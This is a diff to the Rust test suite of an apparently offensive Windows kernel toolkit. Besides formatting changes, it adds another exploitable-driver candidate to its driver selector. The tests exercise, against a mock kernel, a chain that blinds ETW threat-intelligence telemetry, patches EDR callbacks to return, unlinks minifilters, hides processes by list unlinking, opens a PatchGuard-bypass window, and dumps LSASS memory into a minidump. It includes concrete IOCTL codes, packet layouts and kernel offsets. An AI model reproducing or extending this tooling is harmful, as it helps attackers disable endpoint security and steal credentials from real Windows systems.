@@ -34,7 +34,7 @@ use crate::persistence::{
 use crate::telemetry::{CallbackNeutralizer, MiniFilterUnlinker};
 use crate::{
     CallbackKit, CredKit, EtwTiKit, KernelRw, KitError, KrwError, MiniFilterKit, PatchGuardKit,
-    ProcHideKit, PplKit,
+    PplKit, ProcHideKit,
 };
 use alloc::boxed::Box;
 use alloc::collections::BTreeMap;
@@ -67,7 +67,9 @@ impl FakeKernel {
     }
     fn read(&self, addr: usize, len: usize) -> Vec<u8> {
         let m = self.mem.lock();
-        (0..len).map(|i| *m.get(&(addr + i)).unwrap_or(&0)).collect()
+        (0..len)
+            .map(|i| *m.get(&(addr + i)).unwrap_or(&0))
+            .collect()
     }
     fn read_u8(&self, addr: usize) -> u8 {
         *self.mem.lock().get(&addr).unwrap_or(&0)
@@ -132,7 +134,7 @@ unsafe extern "system" fn mock_dioctl(
     _in_len: u32,
     out_buf: *mut c_void,
     out_len: u32,
-    bytes_returned: *mut u32,
+    _bytes_returned: *mut u32,
     _overlapped: *mut c_void,
 ) -> i32 {
     let k = ACTIVE_KERNEL.with(|c| c.get());
@@ -144,7 +146,8 @@ unsafe extern "system" fn mock_dioctl(
         // Shield: one bidirectional IOCTL. direction @ 0x40 (0 = k→u),
         // length @ 0x44, kaddr @ 0x48, payload after the 0x50 header.
         0x9610_2014 => {
-            let pkt = unsafe { core::slice::from_raw_parts_mut(out_buf as *mut u8, out_len as usize) };
+            let pkt =
+                unsafe { core::slice::from_raw_parts_mut(out_buf as *mut u8, out_len as usize) };
             let direction = pkt[0x40];
             let len = u32::from_le_bytes(pkt[0x44..0x48].try_into().unwrap()) as usize;
             let kaddr = u64::from_le_bytes(pkt[0x48..0x50].try_into().unwrap()) as usize;
@@ -185,8 +188,13 @@ impl KernelRw for DriverRw<'_> {
         }
         ACTIVE_KERNEL.with(|c| c.set(self.kernel as *const FakeKernel));
         let r = unsafe {
-            self.driver
-                .raw_rw(RwOp::Read, kaddr as u64, dst, core::ptr::null_mut(), mock_dioctl)
+            self.driver.raw_rw(
+                RwOp::Read,
+                kaddr as u64,
+                dst,
+                core::ptr::null_mut(),
+                mock_dioctl,
+            )
         };
         r.map_err(|ok| KrwError::Partial { ok })
     }
@@ -202,8 +210,13 @@ impl KernelRw for DriverRw<'_> {
         ACTIVE_KERNEL.with(|c| c.set(self.kernel as *const FakeKernel));
         let mut buf = src.to_vec();
         let r = unsafe {
-            self.driver
-                .raw_rw(RwOp::Write, kaddr as u64, &mut buf, core::ptr::null_mut(), mock_dioctl)
+            self.driver.raw_rw(
+                RwOp::Write,
+                kaddr as u64,
+                &mut buf,
+                core::ptr::null_mut(),
+                mock_dioctl,
+            )
         };
         r.map_err(|ok| KrwError::Partial { ok })
     }
@@ -221,6 +234,7 @@ fn select_first_usable_driver(
     let candidates: Vec<(&'static str, Box<dyn VulnDriverIoctl>)> = alloc::vec![
         ("shield", Box::new(Shield)),
         ("wdtkernel", Box::new(WdtKernel)),
+        ("alsysio", Box::new(crate::byovd_drivers::AlsysIo)),
     ];
     for (name, driver) in candidates {
         tried.push(name);
@@ -337,7 +351,11 @@ fn edr_suppression_chain_end_to_end() {
     let wdt_present: &[&[u16]] = &[WdtKernel.device_path()];
     let mut tried2 = Vec::new();
     assert!(select_first_usable_driver(wdt_present, &mut tried2).is_none());
-    assert_eq!(tried2.len(), 2, "every candidate probed, none usable");
+    assert_eq!(
+        tried2.len(),
+        3,
+        "every candidate probed, none usable (wdt + alsysio are phys-only, shield absent)"
+    );
 
     // Every subsequent kernel op rides Shield's real single-IOCTL
     // bidirectional wire format against the shared fake kernel image.
@@ -349,7 +367,10 @@ fn edr_suppression_chain_end_to_end() {
     // ---- Step 2: ETW-TI blind (4-hop chase + single data write) ---------
     let etw_off = EtwTiOffsets::for_build(build).expect("19041 ETW-TI offsets");
     kernel.write_u64(ETW_HANDLE, GUID_ENTRY as u64);
-    kernel.write_u64(GUID_ENTRY + etw_off.guid_entry_to_provider_block, PROV_BLOCK as u64);
+    kernel.write_u64(
+        GUID_ENTRY + etw_off.guid_entry_to_provider_block,
+        PROV_BLOCK as u64,
+    );
     let is_enabled_kva =
         PROV_BLOCK + etw_off.provider_block_to_enable_info + etw_off.is_enabled_within_enable_info;
     kernel.write_u64(is_enabled_kva, 1); // provider ENABLED before the blind
@@ -357,7 +378,10 @@ fn edr_suppression_chain_end_to_end() {
         prov_reg_handle_kva: ETW_HANDLE,
         offsets: etw_off,
     };
-    assert!(!etw.is_blinded(&rw).unwrap(), "provider enabled before blind");
+    assert!(
+        !etw.is_blinded(&rw).unwrap(),
+        "provider enabled before blind"
+    );
     etw.blind(&rw).expect("ETW-TI blind over Shield");
     assert!(etw.is_blinded(&rw).unwrap());
     assert_eq!(kernel.read_u64(is_enabled_kva), 0, "IsEnabled write landed");
@@ -389,7 +413,11 @@ fn edr_suppression_chain_end_to_end() {
     let callbacks = CallbackNeutralizer { runtime };
     let neutralized = callbacks.neutralize(&rw).expect("neutralize");
     assert_eq!(neutralized, 2, "two EDR callbacks, dispatcher skipped");
-    assert_eq!(kernel.read_u8(EDR_CODE + 0x130), 0xC3, "EDR process cb → ret");
+    assert_eq!(
+        kernel.read_u8(EDR_CODE + 0x130),
+        0xC3,
+        "EDR process cb → ret"
+    );
     assert_eq!(kernel.read_u8(EDR_CODE + 0x230), 0xC3, "EDR image cb → ret");
     assert_eq!(
         kernel.read_u8(NT_BASE + 0x1_2340),
@@ -402,7 +430,10 @@ fn edr_suppression_chain_end_to_end() {
     let f1_link = FILTER1 + flt::FLT_OBJECT_PRIMARY_LINK;
     let f2_link = FILTER2 + flt::FLT_OBJECT_PRIMARY_LINK;
     let reg_head = FRAME + flt::FLTP_FRAME_REGISTERED_FILTERS;
-    kernel.write_u64(FLTG + flt::GLOBALS_FRAME_LIST, (FRAME + flt::FLTP_FRAME_LINKS) as u64);
+    kernel.write_u64(
+        FLTG + flt::GLOBALS_FRAME_LIST,
+        (FRAME + flt::FLTP_FRAME_LINKS) as u64,
+    );
     // RegisteredFilters: head ↔ F1 ↔ F2 ↔ head.
     kernel.write_u64(reg_head, f1_link as u64);
     kernel.write_u64(reg_head + 8, f2_link as u64);
@@ -444,7 +475,10 @@ fn edr_suppression_chain_end_to_end() {
         kernel.read_u64(E_LSASS + eproc.active_process_links),
         PS_HEAD as u64
     );
-    assert_eq!(kernel.read_u64(PS_HEAD + 8), (E_LSASS + eproc.active_process_links) as u64);
+    assert_eq!(
+        kernel.read_u64(PS_HEAD + 8),
+        (E_LSASS + eproc.active_process_links) as u64
+    );
     // ...and the remaining processes are still enumerable.
     assert_eq!(
         ProcessHider::find_eprocess(&rw, PS_HEAD, 700, &eproc).unwrap(),
@@ -481,7 +515,10 @@ fn etw_ti_blind_over_shield_protocol() {
         };
         let etw_off = EtwTiOffsets::for_build(19041).unwrap();
         kernel.write_u64(ETW_HANDLE, GUID_ENTRY as u64);
-        kernel.write_u64(GUID_ENTRY + etw_off.guid_entry_to_provider_block, PROV_BLOCK as u64);
+        kernel.write_u64(
+            GUID_ENTRY + etw_off.guid_entry_to_provider_block,
+            PROV_BLOCK as u64,
+        );
         let kva = PROV_BLOCK
             + etw_off.provider_block_to_enable_info
             + etw_off.is_enabled_within_enable_info;
@@ -541,7 +578,12 @@ fn credential_chain_lsass_dump_to_parseable_minidump() {
     const PEB_VA: u64 = 0x0000_7FF0_0000_0000;
     const LSASS_BASE: u64 = 0x0000_0140_0000_0000; // classic pre-ASLR layout
 
-    build_process_list(&phys, PS_HEAD_PA, &[(E_SYS_PA, 4), (E_LSASS_PA, 700)], &eproc);
+    build_process_list(
+        &phys,
+        PS_HEAD_PA,
+        &[(E_SYS_PA, 4), (E_LSASS_PA, 700)],
+        &eproc,
+    );
     phys.write_u64(E_LSASS_PA + DIRECTORY_TABLE_BASE, LSASS_DTB);
     phys.write_u64(E_LSASS_PA + eproc.peb, PEB_VA);
 
@@ -586,7 +628,11 @@ fn credential_chain_lsass_dump_to_parseable_minidump() {
     assert_eq!(ranges.len(), 1);
     assert_eq!(ranges[0].base_address, LSASS_BASE);
     assert_eq!(ranges[0].size as usize, bytes.len());
-    assert_eq!(&ranges[0].bytes[0..2], b"MZ", "raw capture survives the envelope");
+    assert_eq!(
+        &ranges[0].bytes[0..2],
+        b"MZ",
+        "raw capture survives the envelope"
+    );
     let sysinfo = parsed
         .get_stream::<minidump::MinidumpSystemInfo>()
         .expect("SystemInfo stream");
@@ -683,8 +729,12 @@ fn pg_window_offsets_table_integrated_dkom_chain() {
             Err(KitError::NotFound)
         ));
     } // guard Drop → repair (re-zero valid flag, disarm)
-    // The edit persists after the window closes; the repair wrote the flag.
-    assert_eq!(kernel.read_u64(PGCTX + 0x08), 0, "repair kept the flag at 0");
+      // The edit persists after the window closes; the repair wrote the flag.
+    assert_eq!(
+        kernel.read_u64(PGCTX + 0x08),
+        0,
+        "repair kept the flag at 0"
+    );
     assert!(matches!(
         ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc),
         Err(KitError::NotFound)
@@ -751,8 +801,16 @@ fn peekaboo_preferred_window_hides_and_repairs_on_drop() {
     let link = E_TARGET + eproc.active_process_links;
     let flink = kernel.read_u64(link) as usize;
     let blink = kernel.read_u64(link + 8) as usize;
-    assert_eq!(kernel.read_u64(flink + 8) as usize, link, "Flink->Blink == entry");
-    assert_eq!(kernel.read_u64(blink) as usize, link, "Blink->Flink == entry");
+    assert_eq!(
+        kernel.read_u64(flink + 8) as usize,
+        link,
+        "Flink->Blink == entry"
+    );
+    assert_eq!(
+        kernel.read_u64(blink) as usize,
+        link,
+        "Blink->Flink == entry"
+    );
 }
 
 #[test]
@@ -793,7 +851,11 @@ fn pg_window_win11_24h2_thread_suspend_long_window() {
     let window = RuntimePgBypassWindow::new(verified_pg_offsets(true), PRCB, &rw);
     {
         let _guard = window.enter_unchecked(&rw).expect("24H2 long window");
-        assert_eq!(kernel.read_u64(PGCTX + 0x08), 0, "flag zeroed = PG suspended");
+        assert_eq!(
+            kernel.read_u64(PGCTX + 0x08),
+            0,
+            "flag zeroed = PG suspended"
+        );
         let hider = ProcessHider {
             ps_active_process_head_kva: PS_HEAD_C,
             offsets: eproc,
